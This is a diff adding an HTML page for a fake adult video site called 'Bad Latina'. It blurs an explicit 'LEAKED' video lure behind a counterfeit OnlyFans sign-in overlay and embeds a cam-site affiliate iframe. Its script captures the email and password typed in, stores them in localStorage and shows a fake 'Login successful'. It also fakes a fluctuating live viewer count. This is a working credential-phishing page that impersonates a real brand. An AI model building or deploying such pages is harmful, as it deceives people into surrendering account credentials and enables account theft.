@@ -1,0 +1,836 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Bad Latina</title>
+  <meta name="description" content="Bad Latina — community videos and player demo." />
+  <meta name="keywords" content="bad latina, videos, community" />
+  <style>
+    :root {
+      --bg: #0a0a0a;
+      --panel: #111111;
+      --border: #1e1e1e;
+      --text: #e6e6e6;
+      --muted: #a0a0a0;
+      --accent: #ffa31a; /* Pornhub-like orange */
+      --accent-dark: #ff8c00;
+      --success: #00a651;
+    }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      margin: 0;
+    }
+    /* Header styling to match reference exactly */
+    .ph-header {
+      background: #0b0b0b;
+      border-bottom: 1px solid var(--border);
+      width: 100%;
+    }
+
+
+    /* Main header - full width with centered content */
+    .ph-header-inner {
+      background: #0b0b0b;
+      width: 100%;
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+    }
+
+    .ph-header-container {
+      max-width: 1200px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0 20px;
+      height: 100%;
+    }
+
+    .ph-header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex: 0 0 auto;
+    }
+
+    .ph-menu {
+      background: transparent;
+      border: 0;
+      color: var(--accent);
+      font-size: 18px;
+      cursor: pointer;
+      padding: 4px;
+    }
+
+    .ph-logo {
+      display: flex;
+      align-items: center;
+      font-weight: 800;
+      letter-spacing: 0.2px;
+      font-size: 24px;
+    }
+
+    .logo-bad { color: #fff; }
+    .logo-hub {
+      background: var(--accent);
+      color: #000;
+      padding: 4px 8px;
+      margin-left: 4px;
+      border-radius: 4px;
+      font-weight: 800;
+    }
+
+
+    /* Main layout - full width content */
+    .ph-main {
+      display: block;
+      max-width: 1200px;
+      margin: 16px auto;
+      padding: 0 16px;
+    }
+
+    .ph-content {
+      width: 100%;
+    }
+    .player-card {
+      background: var(--panel);
+      padding: 14px;
+      border-radius: 8px;
+      border: 1px solid var(--border);
+      position: relative;
+    }
+
+    /* Video title section styling */
+    .video-title-section {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 15px 0;
+      padding: 0;
+      width: 100%;
+      gap: 20px;
+    }
+
+    .video-title {
+      text-align: left;
+      flex: 1;
+    }
+
+    .video-title h2 {
+      color: #d4af37;
+      font-size: 22px;
+      font-weight: bold;
+      margin: 0;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+      letter-spacing: 0.5px;
+      line-height: 1.3;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      hyphens: auto;
+    }
+
+    .follow-button-container {
+      flex: 0 0 auto;
+      display: flex;
+      align-items: center;
+    }
+
+    .follow-btn {
+      background: var(--accent);
+      color: #000;
+      border: none;
+      padding: 16px 32px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255, 163, 26, 0.4);
+      min-width: 140px;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .follow-btn:hover {
+      background: #e6940f;
+      transform: translateY(-3px) scale(1.05);
+      box-shadow: 0 6px 20px rgba(255, 163, 26, 0.5);
+      border: 2px solid #fff;
+    }
+
+    .follow-btn:active {
+      transform: translateY(-1px) scale(1.02);
+      box-shadow: 0 3px 10px rgba(255, 163, 26, 0.4);
+    }
+
+    /* Following state styles */
+    .follow-btn.following {
+      background: #00a651 !important;
+      color: #fff !important;
+      border: 2px solid #00a651 !important;
+      box-shadow: 0 4px 15px rgba(0, 166, 81, 0.4) !important;
+    }
+
+    .follow-btn.following:hover {
+      background: #008f47 !important;
+      border-color: #008f47 !important;
+      box-shadow: 0 6px 20px rgba(0, 166, 81, 0.5) !important;
+      transform: translateY(-3px) scale(1.05);
+    }
+
+    .follow-btn.following:active {
+      transform: translateY(-1px) scale(1.02);
+      box-shadow: 0 3px 10px rgba(0, 166, 81, 0.4) !important;
+    }
+    .playerContainer {
+      position: relative;
+      padding-top: 56.25%; /* 16:9 */
+      background: #000;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .embedFrame {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: 0;
+      transform: scale(1.3);
+      transform-origin: left center;
+    }
+
+    /* Hide embedded video title and overlay elements */
+    .playerContainer iframe {
+      pointer-events: auto;
+    }
+
+    /* Hide top title/header area */
+    .playerContainer::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 50px;
+      background: #000;
+      z-index: 15;
+      pointer-events: none;
+    }
+
+    /* Hide bottom controls/info area */
+    .playerContainer::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 80px;
+      background: #000;
+      z-index: 15;
+      pointer-events: none;
+    }
+
+    /* Hide side elements with gradient overlay */
+    .playerContainer {
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Viewer count styling */
+    .viewer-count-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+      padding: 12px 16px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+    }
+
+    .viewer-count {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .viewer-icon {
+      font-size: 16px;
+    }
+
+    .viewer-number {
+      color: var(--accent);
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .viewer-text {
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .viewer-status {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .live-indicator {
+      width: 8px;
+      height: 8px;
+      background: #ff0000;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    .live-text {
+      color: #ff0000;
+      font-weight: bold;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7);
+      }
+      70% {
+        box-shadow: 0 0 0 10px rgba(255, 0, 0, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(255, 0, 0, 0);
+      }
+    }
+
+    .shimmer { position: relative; overflow: hidden; }
+    .shimmer::after { content: ""; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent); transform: translateX(-100%); animation: shimmer 1.4s infinite; }
+    @keyframes shimmer { 100% { transform: translateX(100%); } }
+
+
+    /* Mobile responsive adjustments */
+    @media (max-width: 768px) {
+      .ph-main {
+        padding: 0 12px;
+      }
+      
+      .video-title-section {
+        margin: 12px 0;
+        gap: 12px;
+      }
+      
+      .video-title h2 {
+        font-size: 20px;
+      }
+      
+      .follow-btn {
+        padding: 14px 28px;
+        font-size: 15px;
+        min-width: 120px;
+        height: 45px;
+      }
+
+      /* Responsive video scaling for tablet */
+      .embedFrame {
+        transform: scale(1.25);
+        transform-origin: left center;
+      }
+
+      /* Adjust overlays for smaller screens */
+      .playerContainer::before {
+        height: 40px;
+      }
+
+      .playerContainer::after {
+        height: 60px;
+      }
+
+      /* Viewer count mobile adjustments */
+      .viewer-count-container {
+        padding: 10px 12px;
+        margin-top: 12px;
+      }
+      
+      .viewer-number {
+        font-size: 15px;
+      }
+      
+      .viewer-text {
+        font-size: 13px;
+      }
+      
+      .live-text {
+        font-size: 11px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .ph-main {
+        padding: 0 8px;
+      }
+      
+      .video-title-section {
+        margin: 10px 0;
+        gap: 10px;
+      }
+      
+      .video-title h2 {
+        font-size: 18px;
+      }
+      
+      .follow-btn {
+        padding: 12px 24px;
+        font-size: 14px;
+        min-width: 100px;
+        height: 40px;
+      }
+
+      /* Responsive video scaling for mobile */
+      .embedFrame {
+        transform: scale(1.2);
+        transform-origin: left center;
+      }
+
+      /* Adjust overlays for mobile screens */
+      .playerContainer::before {
+        height: 35px;
+      }
+
+      .playerContainer::after {
+        height: 50px;
+      }
+
+      /* Viewer count small mobile adjustments */
+      .viewer-count-container {
+        padding: 8px 10px;
+        margin-top: 10px;
+      }
+      
+      .viewer-number {
+        font-size: 14px;
+      }
+      
+      .viewer-text {
+        font-size: 12px;
+      }
+      
+      .live-text {
+        font-size: 10px;
+      }
+    }
+
+    /* Extra small screens */
+    @media (max-width: 360px) {
+      .embedFrame {
+        transform: scale(1.15);
+        transform-origin: left center;
+      }
+
+      .playerContainer::before {
+        height: 30px;
+      }
+
+      .playerContainer::after {
+        height: 45px;
+      }
+    }
+
+    .ph-footer { text-align: center; padding: 20px; color: #888; font-size: 0.8rem; }
+
+    /* Login Popup Styles */
+    .login-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .login-popup {
+      background: var(--panel);
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      padding: 40px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+      position: relative;
+    }
+
+    .login-popup h2 {
+      color: var(--accent);
+      text-align: center;
+      margin: 0 0 30px 0;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .logo-container {
+      text-align: center;
+      margin: 0 0 20px 0;
+    }
+
+    .onlyfans-logo {
+      max-width: 200px;
+      max-height: 80px;
+      width: auto;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .signin-text {
+      color: var(--muted);
+      font-size: 14px;
+      text-align: center;
+      margin: 8px 0 0 0;
+      font-weight: normal;
+    }
+
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .form-group label {
+      color: var(--text);
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    .form-group input {
+      background: var(--bg);
+      border: 2px solid var(--border);
+      border-radius: 8px;
+      padding: 12px 16px;
+      color: var(--text);
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(255, 163, 26, 0.2);
+    }
+
+    .login-btn {
+      background: var(--accent);
+      color: #000;
+      border: none;
+      padding: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255, 163, 26, 0.4);
+    }
+
+    .login-btn:hover {
+      background: #e6940f;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(255, 163, 26, 0.5);
+    }
+
+    .login-btn:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 10px rgba(255, 163, 26, 0.4);
+    }
+
+    /* Blur effect for main content */
+    .blur-content {
+      filter: blur(5px);
+      pointer-events: none;
+      transition: filter 0.3s ease;
+    }
+
+    /* Mobile responsive for popup */
+    @media (max-width: 480px) {
+      .login-popup {
+        padding: 30px 20px;
+        margin: 20px;
+      }
+      
+      .login-popup h2 {
+        font-size: 20px;
+      }
+      
+      .onlyfans-logo {
+        max-width: 150px;
+        max-height: 60px;
+      }
+      
+      .signin-text {
+        font-size: 12px;
+      }
+      
+      .form-group input {
+        padding: 10px 14px;
+        font-size: 14px;
+      }
+      
+      .login-btn {
+        padding: 14px;
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Login Popup Overlay -->
+  <div id="loginOverlay" class="login-overlay">
+    <div class="login-popup">
+      <h2>Welcome to Bad Latina</h2>
+      <div class="logo-container">
+        <img src="OnlyFans_logo.svg (1).png" alt="OnlyFans Logo" class="onlyfans-logo">
+        <p class="signin-text">Sign in with your Onlyfans account</p>
+      </div>
+      <form class="login-form" id="loginForm">
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" name="email" required placeholder="Enter your email">
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required placeholder="Enter your password">
+        </div>
+        <button type="submit" class="login-btn">LOGIN</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="mainContent">
+  <header class="ph-header">
+
+    <!-- Main header -->
+    <div class="ph-header-inner">
+      <div class="ph-header-container">
+        <div class="ph-header-left">
+          <button class="ph-menu" aria-label="Menu">☰</button>
+          <div class="ph-logo">
+            <span class="logo-bad">Bad</span><span class="logo-hub">Latina</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </header>
+
+  <main class="ph-main">
+    <div class="ph-content">
+      <section class="player-card">
+
+        <!-- 📝 Video title and follow button -->
+        <div class="video-title-section">
+          <div class="video-title">
+            <h2>𝐌𝐚𝐤𝐞 𝐋𝐮𝐧𝐚 𝐂𝐔𝐌 𝐖𝐢𝐭𝐡 𝐒𝐐𝐔𝐈𝐑𝐓! 💦 - LEAKED</h2>
+          </div>
+          <div class="follow-button-container">
+            <button class="follow-btn">FOLLOW</button>
+          </div>
+        </div>
+
+
+        <!-- 🎥 Player container -->
+        <div id="playerContainer" class="playerContainer">
+          <iframe id="embedFrame" class="embedFrame"
+            src="https://cbxyz.com/in/?tour=SHBY&campaign=HeIZW&track=embed&room=sieena"
+            frameborder="0"
+            allowfullscreen>
+          </iframe>
+        </div>
+
+        <!-- 👥 Viewer count -->
+        <div class="viewer-count-container">
+          <div class="viewer-count">
+            <span class="viewer-icon">👁️</span>
+            <span class="viewer-number" id="viewerCount">1,247</span>
+            <span class="viewer-text">viewers</span>
+          </div>
+          <div class="viewer-status">
+            <span class="live-indicator"></span>
+            <span class="live-text">LIVE</span>
+          </div>
+        </div>
+
+      </section>
+      
+    </div>
+
+  </main>
+
+  <footer class="ph-footer">
+    <small>© Bad Latina — demo interface.</small>
+  </footer>
+  </div> <!-- End mainContent -->
+
+  <script>
+    // Login popup functionality
+    const loginOverlay = document.getElementById('loginOverlay');
+    const loginForm = document.getElementById('loginForm');
+    const mainContent = document.getElementById('mainContent');
+
+    // Show popup on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      // Add blur effect to main content
+      mainContent.classList.add('blur-content');
+    });
+
+    // Handle login form submission
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      // Basic validation
+      if (email && password) {
+        // Send data to storage
+        sendLoginData(email, password);
+        
+        // Hide popup and remove blur effect
+        loginOverlay.style.display = 'none';
+        mainContent.classList.remove('blur-content');
+        
+        console.log('Login successful for:', email);
+      } else {
+        alert('Please fill in all fields');
+      }
+    });
+
+    // Function to send login data to storage
+    function sendLoginData(email, password) {
+      // Create login data object
+      const loginData = {
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString(),
+        ip: 'client-side' // This would be server-side in real implementation
+      };
+      
+      // Store in localStorage
+      let existingData = JSON.parse(localStorage.getItem('loginData') || '[]');
+      existingData.push(loginData);
+      localStorage.setItem('loginData', JSON.stringify(existingData));
+      
+      // Optional: Show success message briefly
+      showLoginSuccess();
+    }
+
+    // Function to show login success message
+    function showLoginSuccess() {
+      // Create success message element
+      const successMsg = document.createElement('div');
+      successMsg.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: var(--success);
+        color: white;
+        padding: 15px 20px;
+        border-radius: 8px;
+        font-weight: bold;
+        z-index: 1001;
+        box-shadow: 0 4px 15px rgba(0, 166, 81, 0.4);
+        animation: slideIn 0.3s ease-out;
+      `;
+      successMsg.textContent = '✓ Login successful!';
+      
+      // Add CSS animation
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes slideIn {
+          from { transform: translateX(100%); opacity: 0; }
+          to { transform: translateX(0); opacity: 1; }
+        }
+      `;
+      document.head.appendChild(style);
+      
+      document.body.appendChild(successMsg);
+      
+      // Remove message after 3 seconds
+      setTimeout(() => {
+        successMsg.remove();
+        style.remove();
+      }, 3000);
+    }
+
+    // Video player functionality
+    const embedFrame = document.getElementById('embedFrame');
+
+    // Viewer count functionality
+    const viewerCountElement = document.getElementById('viewerCount');
+    let currentViewers = 1247;
+
+    // Function to update viewer count with realistic fluctuations
+    function updateViewerCount() {
+      // Random fluctuation between -50 and +100 viewers
+      const change = Math.floor(Math.random() * 151) - 50;
+      currentViewers = Math.max(800, currentViewers + change); // Minimum 800 viewers
+      
+      // Format number with commas
+      const formattedCount = currentViewers.toLocaleString();
+      viewerCountElement.textContent = formattedCount;
+    }
+
+    // Update viewer count every 3-8 seconds for realistic feel
+    function startViewerCountUpdates() {
+      updateViewerCount();
+      const nextUpdate = Math.random() * 5000 + 3000; // 3-8 seconds
+      setTimeout(startViewerCountUpdates, nextUpdate);
+    }
+
+    // Start viewer count updates after page loads
+    setTimeout(startViewerCountUpdates, 2000);
+
+    // Follow button functionality
+    const followBtn = document.querySelector('.follow-btn');
+    
+    followBtn.addEventListener('click', function() {
+      if (followBtn.textContent === 'FOLLOW') {
+        // Change to FOLLOWING state
+        followBtn.innerHTML = '✓ FOLLOWING';
+        followBtn.classList.add('following');
+        
+        // Add a small animation feedback
+        followBtn.style.transform = 'scale(0.95)';
+        setTimeout(() => {
+          followBtn.style.transform = '';
+        }, 150);
+        
+      } else {
+        // Change back to FOLLOW state
+        followBtn.textContent = 'FOLLOW';
+        followBtn.classList.remove('following');
+      }
+    });
+  </script>
+</body>
+</html>
